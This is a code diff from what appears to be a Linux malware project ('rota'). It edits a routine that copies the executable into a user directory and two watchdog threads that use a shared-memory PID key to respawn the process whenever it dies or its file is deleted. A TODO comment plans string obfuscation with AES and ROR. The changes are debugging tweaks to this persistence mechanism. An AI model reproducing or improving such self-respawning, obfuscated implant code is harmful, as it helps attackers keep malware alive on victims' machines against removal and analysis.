@@ -33,7 +33,7 @@ bool copy_rota_to_userland(char *destpath) {
     int fout  = open(destpath, O_CREAT|O_WRONLY, 0755);
     int bytesWritten = write(fout, exe, fsize);
     free(exe);
-
+    close(fout);
     // if bytes written == size of file
     if (bytesWritten == fsize) {
         return true;
@@ -373,9 +373,9 @@ void *watchdog_process_shmget(void *fpath) {
     int shmid = shmget(0x64b2e2, 8, IPC_CREAT |0666);
     if (shmid <= 0) {
         #ifdef DEBUG
-        fprintf(stderr, "\n[wathcdog_process_shmget] Error getting shared memory : %s\n", strerror(errno));
+        fprintf(stderr, "\n[wathcdog_process_shmget](%d) Error getting shared memory : %s\n", getpid(), strerror(errno));
         #endif
-        fork_exec(fpath);
+        //fork_exec(fpath);
     }
 
     // write PID to sharedmem
@@ -385,7 +385,6 @@ void *watchdog_process_shmget(void *fpath) {
     // TODO - stackstring + AES + ROR here
     //
     do {
-
         //  check /proc/<PID> exists....
         // get pid from shared memory.
         char *shmem_pid_addr = shmat(shmid, NULL, 0);
@@ -394,9 +393,10 @@ void *watchdog_process_shmget(void *fpath) {
         //if proc not there, exec into existence
         if (proc_alive == false) {
             #ifdef DEBUG
-            fprintf(stderr, "[shmget] process is not alive! spawning\n");
+            fprintf(stderr, "[shmget](%d) process is not alive! spawning\n", getpid());
             #endif
-            fork_exec(fpath);
+            //fork_exec(fpath);
+            pthread_detach(pthread_self());
         }
 
         sleep(3);
@@ -419,9 +419,9 @@ void *watchdog_process_shmread(void *fpath) {
         int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
         if (shmid <= 0) {
             #ifdef DEBUG
-            fprintf(stderr, "\n[wathcdog_process_shmread] %s\n", strerror(errno));
+            fprintf(stderr, "\n[wathcdog_process_shmread](%d) %s\n", getpid(),strerror(errno));
             #endif
-            fork_exec(fpath);
+            //fork_exec(fpath);
         }
         // get pid from shared memory.
         char *shmem_pid_addr = shmat(shmid, NULL, 0);
@@ -430,15 +430,15 @@ void *watchdog_process_shmread(void *fpath) {
         //if proc pid entry not there, exec into existence
         if (proc_alive == false) {
             #ifdef DEBUG
-            fprintf(stderr, "[shmread] process is not alive! spawning\n");
+            fprintf(stderr, "[shmread] (%d) process is not alive! spawning\n", getpid());
             #endif
             fork_exec(fpath);
+            pthread_detach(pthread_self());
         }
         // if process dies execute
         if (access(fpath, F_OK) != 0) {
             fork_exec(fpath);
         }
-
         sleep(3);
     } while(true);
 
